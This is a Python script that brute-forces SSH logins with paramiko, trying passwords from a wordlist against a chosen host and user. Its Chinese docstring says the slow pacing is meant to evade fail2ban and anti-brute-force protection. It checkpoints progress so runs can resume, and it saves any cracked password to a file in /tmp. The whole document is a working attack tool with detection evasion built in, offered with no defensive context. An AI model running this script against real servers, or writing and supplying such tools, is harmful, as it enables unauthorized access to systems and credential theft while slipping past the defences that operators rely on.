#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SSH 极低频慢爆 - 每次间隔 delay 秒, 避免触发 fail2ban/防爆破. 支持断点续跑."""
import sys, time, os, paramiko

def try_one(host, user, passwd):
    cl = paramiko.SSHClient()
    cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cl.connect(host, port=22, username=user, password=passwd, timeout=6,
                   banner_timeout=6, auth_timeout=6, look_for_keys=False, allow_agent=False)
        return "SUCCESS"
    except paramiko.AuthenticationException:
        return "FAIL"
    except Exception:
        return "NET"
    finally:
        try: cl.close()
        except Exception: pass

def main():
    host, user, wordlist = sys.argv[1], sys.argv[2], sys.argv[3]
    delay = float(sys.argv[4]) if len(sys.argv) > 4 else 4.0
    ck = f"/tmp/ssh_ck_{host.replace('.','_')}_{user}.pos"
    lines = []
    with open(wordlist, encoding='utf-8', errors='replace') as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    start = 0
    if os.path.exists(ck):
        try: start = int(open(ck).read().strip())
        except: pass
    print(f"[start] {user}@{host} total={len(lines)} from={start} delay={delay}s", flush=True)
    try:
        for i in range(start, len(lines)):
            p = lines[i]
            r = try_one(host, user, p)
            if r == "SUCCESS":
                print(f"\n[***] FOUND: {user} / {p}", flush=True)
                open('/tmp/ssh_hit.txt','a').write(f"{host} {user} {p}\n")
                return
            with open(ck, 'w') as f: f.write(str(i+1))
            if (i+1) % 10 == 0:
                print(f"[progress] {i+1}/{len(lines)} ({p})", flush=True)
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"[paused] at {i}, resume next run", flush=True)
        return
    print(f"[done] no hit ({len(lines)} tried)", flush=True)

if __name__ == "__main__":
    main()
